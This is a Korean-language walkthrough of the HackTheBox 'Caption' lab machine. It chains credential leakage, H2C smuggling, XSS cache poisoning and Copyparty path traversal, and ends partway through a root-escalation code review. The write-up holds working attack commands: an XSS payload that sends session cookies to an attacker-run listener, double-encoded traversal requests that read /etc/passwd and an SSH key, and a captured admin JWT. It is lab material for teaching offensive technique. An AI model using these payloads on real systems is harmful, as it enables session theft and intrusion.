---
title: "Caption (Hard)"
date: 2026-03-13
layout: single
excerpt: "Caption은 Hard 난이도의 Linux 머신으로, 기본 자격 증명을 통해 GitBucket에 접근하여 commit 기록에서 웹 포털 로그인 정보를 획득하고, Web Cache Deception(WCD)과 XSS를 이용한 응답 캐시 오염을 통해 관리자 세션을 탈취한다. 이후 HTTP/2 Cleartext 터널(H2C Smuggling)을 사용해 HAProxy의 접근 제어를 우회하여 내부 서비스에 접근하고, 해당 서비스의 Path Traversal 취약점(CVE-2023-37474)을 악용해 SSH ECDSA 개인 키를 읽어 초기 foothold를 획득한다. 마지막으로 루트 권한으로 실행되는 Apache Thrift 서비스의 Command Injection 취약점을 이용해 임의 명령을 실행하고 최종적으로 루트 권한을 탈취한다."
author_profile: true
toc: true
toc_label: "Caption"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/caption/caption.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, gitbucket, credential-leak, haproxy, varnish, cache-poisoning, web-cache-deception, xss, h2c-smuggling, path-traversal, cve-2023-37474, copyparty, jwt, ssh, thrift, command-injection, rpc, priv-esc, suid]

---

![Caption](/assets/htb-linux/caption/caption.png)

**Caption**은 Hard 난이도의 Linux 머신으로, 기본 자격 증명을 통해 GitBucket에 접근하여 commit 기록에서 웹 포털 로그인 정보를 획득하고, **Web Cache Deception(`WCD`)**과 **XSS**를 이용한 응답 캐시 오염을 통해 관리자 세션을 탈취한다. 

이후 **HTTP/2 Cleartext 터널(`H2C Smuggling`)**을 사용해 HAProxy의 접근 제어를 우회하여 내부 서비스에 접근하고, 해당 서비스의 **Path Traversal 취약점(`CVE-2023-37474`)**을 악용해 **SSH ECDSA 개인 키**를 읽어 초기 foothold를 획득한다. 

마지막으로 루트 권한으로 실행되는 Apache Thrift 서비스의 **Command Injection 취약점**을 이용해 임의 명령을 실행하고 최종적으로 **루트 권한을 탈취**한다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.230.251`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.230.251 | tee nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 04:20 EDT
Nmap scan report for caption.htb (10.129.230.251)
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http-proxy HAProxy http proxy 2.0.0 or later
|_http-title: Caption Portal Login
|_http-server-header: Werkzeug/3.0.1 Python/3.10.12
|_http-open-proxy: Proxy might be redirecting requests
8080/tcp open  http       Jetty
|_http-title: GitBucket
Service Info: OS: Linux; Device: load balancer; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.59 seconds
```

스캔 결과 `SSH(22)`, `HTTP(80, 8080)` 포트가 열려 있는 것을 확인하였다.

특히 `80` 포트는 **HAProxy**가 동작하고 있으며, 웹 페이지에 접근하면 **Caption Portal Login** 페이지가 나타난다.  
또한 `8080` 포트에서는 **GitBucket** 서비스가 실행되고 있는 것을 확인할 수 있다.

웹 페이지 접근 시 **caption.htb** 도메인으로 접근해야 함을 확인하였다.

---

# Vulnerability Analysis

`80` 번 포트 웹 사이트에 접속하면 **Caption Portal Login** 페이지가 표시되며, 사용자 이름과 비밀번호를 입력할 수 있는 로그인 폼이 제공된다:

![Caption](/assets/htb-linux/caption/login.png)

## 8080 Port Web Service

`8080` 포트에 접근하면 **GitBucket** 기반의 웹 서비스가 실행되고 있으며, 내부에는 **Logservice**와 **Caption-Portal** 두 개의 레포지토리가 존재하는 것을 확인할 수 있다:

> **Logservice** 레포지토리는 이후 **Root Privilege Escalation** 단계에서 자세히 분석한다.

![Caption](/assets/htb-linux/caption/gitbucket.png)

### Caption-Portal Source Code Analysis

`Caption-Portal` 저장소 내부에는 `app`, `config`, `README.md` 파일이 존재하는 것을 확인할 수 있다:

![Caption](/assets/htb-linux/caption/caption-portal.png)

이 중 `config` 디렉토리를 확인해 보면 내부에 [haproxy](https://www.haproxy.org/), [varnish](https://vinyl-cache.org/) 디렉토리가 존재하며, 웹 인프라에서 프록시 및 캐싱과 관련된 설정 파일들이 포함되어 있는 것을 확인할 수 있다:

![Caption](/assets/htb-linux/caption/config.png)

우선 `haproxy.cfg` 파일을 확인하여 HAProxy의 동작 방식을 분석하였다:

```bash
global
        log /dev/log    local0
        log /dev/log    local1 notice
        chroot /var/lib/haproxy
        stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
        stats timeout 30s
        user haproxy
        group haproxy
        daemon
  
        # Default SSL material locations
        ca-base /etc/ssl/certs
        crt-base /etc/ssl/private
  
        # See: https://ssl-config.mozilla.org/#server=haproxy&server-version=2.0.3&config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets
  
defaults
        log     global
        mode    http
        option  httplog
        option  dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
        errorfile 400 /etc/haproxy/errors/400.http
        errorfile 403 /etc/haproxy/errors/403.http
        errorfile 408 /etc/haproxy/errors/408.http
        errorfile 500 /etc/haproxy/errors/500.http
        errorfile 502 /etc/haproxy/errors/502.http
        errorfile 503 /etc/haproxy/errors/503.http
        errorfile 504 /etc/haproxy/errors/504.http
  
  
frontend http_front
    bind *:80
    default_backend http_back
    acl multi_slash path_reg -i ^/[/%]+
    http-request deny if multi_slash
    acl restricted_page path_beg,url_dec -i /logs
    acl restricted_page path_beg,url_dec -i /download
    http-request deny if restricted_page
    acl not_caption hdr_beg(host) -i caption.htb
    http-request redirect code 301 location http://caption.htb if !not_caption
  
backend http_back
    balance roundrobin
    server server1 127.0.0.1:6081 check
```

해당 설정을 살펴보면 `frontend http_front` 에서 `80` 포트로 들어오는 HTTP 요청을 처리하며, 기본적으로 `http_back` 백엔드(`127.0.0.1:6081`)로 전달되는 것을 확인할 수 있다.

또한 몇가지 접근 규칙이 존재한다:

- 정규표현식을 이용하여 URL 경로에 여러 개의 슬래시(`/`)가 포함된 요청을 차단한다.
- `/logs`, `/download` 경로로 시작하는 요청을 URL 디코딩(`url_dec`) 후 검사하여 해당 경로에 대한 접근을 HAProxy 단계에서 차단한다.
- `Host` 헤더가 `caption.htb`가 아닌 경우 `http://caption.htb`로 `301` 리다이렉트가 수행된다.

백엔드 주소(`127.0.0.1:6081`)의 동작을 확인하기 위해 `service` 디렉토리에 존재하는 `varnish.service` 파일을 확인하였다:

```bash
[Unit]
Description=Varnish Cache, a high-performance HTTP accelerator
Documentation=https://www.varnish-cache.org/docs/ man:varnishd
  
[Service]
Type=simple
  
# Maximum number of open files (for ulimit -n)
LimitNOFILE=131072
  
# Locked shared memory - should suffice to lock the shared memory log
# (varnishd -l argument)
# Default log size is 80MB vsl + 1M vsm + header -> 82MB
# unit is bytes
LimitMEMLOCK=85983232
ExecStart=/usr/sbin/varnishd \
          -j unix,user=vcache \
          -F \
          -a localhost:6081 \
          -T localhost:6082 \
          -f /etc/varnish/default.vcl \
          -S /etc/varnish/secret \
          -s malloc,256m \
          -p feature=+http2
ExecReload=/usr/share/varnish/varnishreload
ProtectSystem=full
ProtectHome=true
PrivateTmp=true
PrivateDevices=true
  
[Install]
WantedBy=multi-user.target
```

특히 주목할 부분은 `-a localhost:6081` 옵션이다.

해당 옵션은 **Varnish가 HTTP 요청을 수신하는 리스닝 주소**를 의미하며, `haproxy.cfg` 에서 확인된 백엔드 주소(`127.0.0.1:6081`)와 동일하다.

또한 `-p feature=+http2` 옵션을 통해 HTTP/2 기능이 활성화되어 있는 것을 확인할 수 있으며, 이는 이후 **H2C Smuggling 공격**과 관련될 가능성을 보여준다.

이를 통해 외부에서 들어오는 요청이 HAProxy를 거쳐 Varnish 캐시 서버로 전달되는 구조임을 확인할 수 있다:

```text
Client → HAProxy → Varnish → Backend
```

이후 `varnish` 디렉토리에 존재하는 `default.vcl` 파일을 분석하였다:

```vcl
vcl 4.0;
  
backend default {
    .host = "127.0.0.1";
    .port = "8000";
}
  
sub vcl_recv {
  // update for prod - CR-3045
}
  
sub vcl_backend_response {
  // update for prod - CR-3045
}
  
sub vcl_deliver {
  // update for prod - CR-3045
}
```

초기 `nmap` 열거 과정에서 웹 서버의 `Werkzeug` 헤더(`Werkzeug/3.0.1 Python/3.10.12`)가 확인되었다. 

`Werkzeug`는 Python 기반 WSGI 서버로, 일반적으로 Flask 프레임워크에서 사용되므로 백엔드에서 Flask 기반 웹 애플리케이션이 동작하고 있을 가능성을 추정할 수 있다.

### Credentials Exposed in Commit History

GitBucket 저장소의 commit 기록을 확인하던 중, 이전 commit에서 HAProxy 설정 파일(`haproxy.cfg`)에 **사용자 인증 정보가 하드코딩된 상태**로 포함되어 있던 것을 확인할 수 있었다.

해당 commit에서는 다음과 같이 `margo` 사용자 계정의 자격증명이 노출되어 있다:

![Caption](/assets/htb-linux/caption/id.png)

## Web Enumeration

앞서 Git commit 기록에서 획득한 `margo` 계정의 자격증명을 사용하여 `80` 번 포트의 웹 사이트에 로그인할 수 있었다:

![Caption](/assets/htb-linux/caption/website.png)

또한 `Firewalls` 메뉴가 존재하며, `/logs` 경로에 접근을 시도했지만 `403 Forbidden` 응답이 반환되는 것을 확인할 수 있었다:

![Caption](/assets/htb-linux/caption/403.png)

이는 앞서 분석한 `haproxy.cfg` 설정에서 `/logs`와 `/download` 경로에 대한 접근이 차단되어 있기 때문이다.

따라서 관리자 권한으로 로그인하더라도 해당 엔드포인트에는 직접 접근할 수 없다.

## Bypassing HAProxy via H2C Smuggling

앞서 확인한 것처럼 `/logs` 경로에 대한 접근은 HAProxy의 ACL 규칙에 의해 프록시 레벨에서 차단되고 있다.

또한 `varnish.service` 설정 파일을 살펴보면 `-p feature=+http2` 옵션이 활성화되어 있어 Varnish가 `HTTP/2` 기능을 지원하고 있는 것을 확인할 수 있다.

이러한 구조를 고려했을 때, 프록시의 접근 제어를 우회하기 위해 **H2C Smuggling** 기법을 사용할 수 있다.

[h2c](https://bishopfox.com/blog/h2c-smuggling-request)는 HTTP/1.1 연결을 **HTTP/2 Cleartext(H2C)**로 업그레이드하여 리버스 프록시 뒤에 위치한 내부 서비스와 직접 통신할 수 있도록 하는 기법이다.

GitHub에 공개된 [h2csmuggler](https://github.com/BishopFox/h2csmuggler) 도구를 활용하여 `/logs` 경로에 접근을 시도하였다:

```bash
$ python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  
    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>


  <title>Caption Portal Login</title>

  <link rel="canonical" href="https://codepen.io/Tushar-Sandhu/pen/YzRROwd">
  <script>
    window.console = window.console || function(t) {};
  </script>

# SKIP
</body>

</html>

[INFO] Requesting - /logs
:status: 302
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 13 Mar 2026 12:38:24 GMT
content-type: text/html; charset=utf-8
content-length: 189
location: /
x-varnish: 262198
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

기존에는 `/logs` 경로에 접근할 경우 `403 Forbidden` 응답이 반환되었지만, **H2C Smuggling**을 통해 요청을 전달했을 때 `302 Redirect` 응답이 반환되는 것을 확인할 수 있었다.

즉, H2C Smuggling을 통해 **HAProxy의 ACL을 우회**할 수 있음을 확인하였다.

## Web Cache Deception & Cache Poisoning (XSS)

Burp Suite를 이용하여 `/home` 경로에 대한 요청을 확인해보면, 응답 헤더에 Varnish 관련 캐시 헤더가 포함되어 있는 것을 확인할 수 있다:

![Caption](/assets/htb-linux/caption/home.png)

그러나 동일한 요청을 반복적으로 전송해보면 `age` 값이 계속 `0` 으로 유지되는 것을 확인할 수 있다.  

이는 해당 요청이 캐시에 저장되지 않고 매번 백엔드로 전달되고 있음을 의미하며, Varnish 캐시가 정상적으로 동작하지 않는 것으로 보인다.

하지만 `/firewalls` 경로에서는 응답 헤더의 `Cache-Control` 값이 `public, max-age=120`으로 설정되어 있는 것을 확인할 수 있다.  

또한 동일한 요청을 반복적으로 전송하면 `age` 값이 증가하는 것을 확인할 수 있으며, 이는 해당 페이지가 Varnish 캐시에 저장되고 있음을 의미한다:

![Caption](/assets/htb-linux/caption/firewalls.png)

즉, 해당 요청은 최초에는 백엔드 서버로 전달되지만 이후 `120` 초 동안 캐시 서버에 저장되며, 동일한 요청이 들어올 경우 백엔드를 거치지 않고 캐시된 응답을 반환하게 된다.

이후 응답을 분석하던 중 JavaScript 파일을 로드하는 `<script>` 태그에서 다음과 같은 URL을 확인할 수 있었다:

![Caption](/assets/htb-linux/caption/javascript.png)

해당 URL의 `utm_source` 파라미터에 내부 프록시 주소(`internal-proxy.local`)가 포함되어 있는 것을 확인할 수 있다.

이를 통해 애플리케이션이 프록시 환경과 관련된 정보를 응답 페이지에 반영하고 있을 가능성을 확인할 수 있다.

따라서 해당 값이 HTTP 헤더를 통해 조작 가능한지 확인하기 위해 여러 프록시 관련 헤더를 조작하여 테스트를 진행하였다:

![Caption](/assets/htb-linux/caption/test.png)

그 결과 `X-Forwarded-Host` 헤더 값이 응답 페이지의 `utm_source` 파라미터에 그대로 반영되는 것을 확인할 수 있었다.

`X-Forwarded-Host` 헤더에 다음과 같은 XSS payload를 삽입하여 테스트를 진행하였다:

```http
X-Forwarded-Host: test"><script>alert(1)</script>
```

그 결과 payload가 응답 페이지에 그대로 반영되며, XSS가 정상적으로 발생하는 것을 확인할 수 있었다:

![Caption](/assets/htb-linux/caption/xss.png)

현재 `/firewalls` 페이지는 `Cache-Control: public, max-age=120` 설정으로 인해 약 120초 동안 캐시에 저장된다. 

또한 앞서 확인한 것처럼 `X-Forwarded-Host` 헤더 값을 통해 XSS 공격이 가능하다.  

따라서 해당 페이지에 XSS payload를 삽입한 뒤 캐시에 저장되도록 유도하면 **Cache Poisoning 공격**이 가능하다는 것을 확인할 수 있다.

개발자 도구를 통해 쿠키 속성을 확인해 보면 `session` 쿠키에 `HttpOnly` 옵션이 설정되어 있지 않은 것을 확인할 수 있다:

![Caption](/assets/htb-linux/caption/httponly.png)

따라서 JavaScript를 이용하여 사용자의 쿠키를 탈취할 수 있다.

우선 로컬 터미널에서 HTTP 서버를 실행하였다:

```bash
$ python3 -m http.server
```

그 후 `X-Forwarded-Host` 헤더에 다음과 같은 XSS payload를 삽입하여 요청을 전송하였다:

```http
X-Forwarded-Host: test"><script>new Image().src='http://10.10.14.26:8000/?c='+document.cookie</script>
```

이후 해당 요청이 캐시에 저장되도록 유도한 뒤, 약 120초 동안 캐시에 저장된 페이지가 사용자에게 전달되면서 공격자의 서버로 쿠키가 전송되는 것을 확인할 수 있었다:

```bash
$ python3 -m http.server

10.129.230.251 - - [13/Mar/2026 12:32:25] "GET /?c=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzczNDIzMTQ0fQ.rUK80NtQLcSnHFCZVmVQ1jX05OL6EdtzpZtgxqSJVaU HTTP/1.1" 200 -
```

## Path Traversal (CVE-2023-37474)

JWT는 `header.payload.signature` 구조로 이루어져 있으며, 이 중 `payload` 부분에는 사용자와 관련된 클레임 정보가 포함되어 있다.

payload는 Base64로 인코딩되어 있기 때문에 디코딩을 통해 내용을 확인할 수 있으며, 디코딩 결과 `username` 값이 `admin` 으로 설정되어 있는 것을 확인할 수 있다:

```bash
$ echo "eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzczNDIzMTQ0fQ" | base64 -d

{"username":"admin","exp":1773423144}
```

획득한 admin JWT 쿠키를 사용하여 `h2csmuggler` 를 통해 `/logs` 경로에 다시 요청을 전송하였다:

```bash
$ python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H "Cookie: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzczNDIzMTQ0fQ.rUK80NtQLcSnHFCZVmVQ1jX05OL6EdtzpZtgxqSJVaU"

# SKIP

[INFO] Requesting - /logs
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 13 Mar 2026 14:33:07 GMT
content-type: text/html; charset=utf-8
content-length: 4228
x-varnish: 98334
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

# SKIP

<h1>Log Management</h1>

<ul>
  <li><a href="/download?url=http://127.0.0.1:3923/ssh_logs">SSH Logs</a></li>
  <li><a href="/download?url=http://127.0.0.1:3923/fw_logs">Firewall Logs</a></li>
  <li><a href="/download?url=http://127.0.0.1:3923/zk_logs">Zookeeper Logs</a></li>
  <li><a href="/download?url=http://127.0.0.1:3923/hadoop_logs">Hadoop Logs</a></li>
</ul>
```

해당 페이지에서는 `/download` 엔드포인트를 통해 내부 서비스(`127.0.0.1:3923`)에서 제공하는 로그 파일들이 존재한다.

이 중 `ssh_logs` 파일을 확인해보면, `margo` 사용자가 SSH를 통해 시스템에 접속한 기록을 확인할 수 있다:

```text
Mar  6 09:16:59 caption sshd[1619]: Accepted publickey for margo from 10.10.14.13 port 35916 ssh2: ECDSA SHA256:ui/tjroDv1J8dgCcGNIaAr3QIk9BBLFDJVwiH9emcSQ
```

다른 로그 파일에서는 추가적인 정보를 확인할 수 없었기 때문에 `127.0.0.1:3923` 내부 서비스의 루트 디렉토리를 직접 탐색해 보았다:

```bash
$ python3 h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923 -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzczNDIzMTQ0fQ.rUK80NtQLcSnHFCZVmVQ1jX05OL6EdtzpZtgxqSJVaU"

# SKIP

[INFO] Requesting - /download?url=http://127.0.0.1:3923
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 13 Mar 2026 16:37:21 GMT
content-type: text/html; charset=utf-8
content-length: 4400
x-varnish: 98389
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>💾🎉</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimum-scale=0.6">
    <meta name="theme-color" content="#333">

    <h2 id="wfp"><a href="/?h" id="goh">control-panel</a></h2>
    <a href="#" id="repl">π</a>

</div>
    <div id="srv_info"><span>caption</span> // <span>2.66 GiB free of 8.76 GiB</span></div>

    <div id="widget"></div>

    <script>
            var SR = "",
                    TS = "s8dw",
                    acct = "*",
                    perms = ["read"],
                    dgrid = false,
                    themes = 8,
                    dtheme = "az a z",
                    srvinf = "caption</span> // <span>2.66 GiB free of 8.76 GiB",
                    lang = "eng",
                    dfavico = "🎉 000 none",
                    def_hcols = [],
                    have_up2k_idx = false,
                    have_tags_idx = false,
                    have_acode = false,
                    have_mv = true,
                    have_del = true,
                    have_unpost = 43200,
                    have_zip = true,
                    sb_md = "downloads forms popups scripts top-navigation-by-user-activation",
                    sb_lg = "downloads forms popups scripts top-navigation-by-user-activation",
                    lifetime = 0,
                    turbolvl = 0,
                    idxh = 0,
                    frand = false,
                    u2sort = "s",
                    have_emp = false,
                    txt_ext = "txt nfo diz cue readme",
                    logues = ["", ""],
                    readme = "",
                    ls0 = null;

            document.documentElement.className = localStorage.theme || dtheme;
    </script>
    <script src="/.cpr/util.js?_=s8dw"></script>
    <script src="/.cpr/baguettebox.js?_=s8dw"></script>
    <script src="/.cpr/browser.js?_=s8dw"></script>
    <script src="/.cpr/up2k.js?_=s8dw"></script>
</body>

</html>
```

루트 디렉토리에 접근하면 폭죽 이모지와 함께 파일 브라우저 형태의 웹 인터페이스가 나타난다.

페이지에서 확인된 script 경로(`/.cpr/`)를 검색해보니 해당 서비스가 [Copyparty](https://github.com/9001/copyparty) 파일 서버임을 확인할 수 있었다.

> Copyparty에는 **Path Traversal 취약점([CVE-2023-37474](https://github.com/advisories/GHSA-pxfv-7rr3-2qjg))**이 존재하며, 이를 통해 서버의 파일을 읽을 수 있다.

처음에는 일반적인 경로 인코딩을 사용하여 `/etc/passwd` 파일을 요청했지만 404 페이지가 반환되며 정상적으로 동작하지 않았다.

따라서 **이중 URL 인코딩**을 사용하여 요청을 우회하였다:

```bash
$ python3 h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzczNDIzMTQ0fQ.rUK80NtQLcSnHFCZVmVQ1jX05OL6EdtzpZtgxqSJVaU"

# SKIP

[INFO] Requesting - /download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 13 Mar 2026 16:57:50 GMT
content-type: text/html; charset=utf-8
content-length: 2122
x-varnish: 98401
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
haproxy:x:114:120::/var/lib/haproxy:/usr/sbin/nologin
varnish:x:115:121::/nonexistent:/usr/sbin/nologin
vcache:x:116:121::/nonexistent:/usr/sbin/nologin
varnishlog:x:117:121::/nonexistent:/usr/sbin/nologin
margo:x:1000:1000:,,,:/home/margo:/bin/bash
ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

요청 결과 `/etc/passwd` 파일의 내용을 정상적으로 확인할 수 있었다.

---

# Exploitation

## Retrieving margo's SSH Private Key

이전에 확인한 `ssh_logs` 파일에서 `margo` 사용자가 **ECDSA 공개키 인증**을 이용하여 SSH 접속을 수행한 기록을 확인할 수 있었다.

따라서 `margo` 사용자의 SSH 개인키가 시스템에 존재할 가능성을 고려하여 `.ssh` 디렉토리를 탐색하였다:

```bash
$ python3 h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzczNDIzMTQ0fQ.rUK80NtQLcSnHFCZVmVQ1jX05OL6EdtzpZtgxqSJVaU"

# SKIP

[INFO] Requesting - /download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 13 Mar 2026 17:11:15 GMT
content-type: text/html; charset=utf-8
content-length: 492
x-varnish: 98409
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

-----BEGIN OPENSSH PRIVATE KEY-----

-----END OPENSSH PRIVATE KEY-----
```

요청 결과 `margo` 사용자의 **SSH 개인키**를 정상적으로 획득할 수 있었다.

획득한 개인키를 로컬 시스템에 저장한 후 SSH 접속을 시도하였다:

![Caption](/assets/htb-linux/caption/margo-shell.png)

SSH 연결 결과 `margo` 사용자의 셸에 정상적으로 접근에 성공하였다.

---

# Privilege Escalation

## Service Enumeration

셸 접근 후, 시스템에서 열려 있는 포트를 확인하였다:

```bash
margo@caption:~$ netstat -antp

# SKIP

tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -
```

출력 결과 내부에서만 접근 가능한 `9090` 포트가 열려 있는 것을 확인할 수 있었다.

이후 실행 중인 프로세스를 확인하기 위해 `ps` 명령을 사용하였다:

```bash
margo@caption:~$ ps aux | grep server

root        1025  0.0  0.0   2892   948 ?        Ss   07:01   0:00 /bin/sh -c cd /root;/usr/local/go/bin/go run server.go
root        1026  0.0  0.4 1240804 17816 ?       Sl   07:01   0:01 /usr/local/go/bin/go run server.go
root        1397  0.0  0.1 1083448 4508 ?        Sl   07:01   0:00 /tmp/go-build369158430/b001/exe/server
margo       1870  0.0  0.0   6480  2276 pts/0    S+   09:39   0:00 grep --color=auto server
```

확인 결과 `server.go` 파일이 `root` 권한으로 실행되고 있는 것을 확인할 수 있었다.

## Logservice Source Code Analysis

앞서 `8080` 포트에서 확인했던 **GitBucket** 웹 서비스에는 `Logservice` 와 `Caption-Portal` 두 개의 레포지토리가 존재하였다.

이 중 `Logservice` 레포지토리에는 `server.go`, `log_service.thrift` 파일과 `gen-go` 디렉토리가 포함되어 있는 것을 확인할 수 있었다:

![Caption](/assets/htb-linux/caption/logservice.png)

`log_service.thrift` 파일은 [Apache Thrift](https://thrift.apache.org/)에서 사용하는 **Interface Definition Language** 파일로, 서비스에서 제공하는 RPC 메서드와 데이터 구조를 정의하는 역할을 한다.

해당 파일의 내용은 다음과 같다:

```thrift
namespace go log_service
  
service LogService {
    string ReadLogFile(1: string filePath)
}
```

위 정의에 따르면 클라이언트는 `ReadLogFile()` RPC 메서드에 문자열 형태의 `filePath` 인자를 전달할 수 있으며, 서버는 해당 경로의 파일을 열어 로그를 처리하게 된다.

이후 `Logservice` 레포지토리의 `server.go` 파일을 확인해보았다:

```go
package main
  
import (
    "context"
    "fmt"
    "log"
    "os"
    "bufio"
    "regexp"
    "time"
    "github.com/apache/thrift/lib/go/thrift"
    "os/exec"
    "log_service"
)
  
type LogServiceHandler struct{}
  
func (l *LogServiceHandler) ReadLogFile(ctx context.Context, filePath string) (r string, err error) {
    file, err := os.Open(filePath)
    if err != nil {
        return "", fmt.Errorf("error opening log file: %v", err)
    }
    defer file.Close()
    ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
    userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
    outputFile, err := os.Create("output.log")
    if err != nil {
        fmt.Println("Error creating output file:", err)
        return
    }
    defer outputFile.Close()
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := scanner.Text()
        ip := ipRegex.FindString(line)
        userAgentMatch := userAgentRegex.FindStringSubmatch(line)
        var userAgent string
        if len(userAgentMatch) > 1 {
            userAgent = userAgentMatch[1]
        }
        timestamp := time.Now().Format(time.RFC3339)
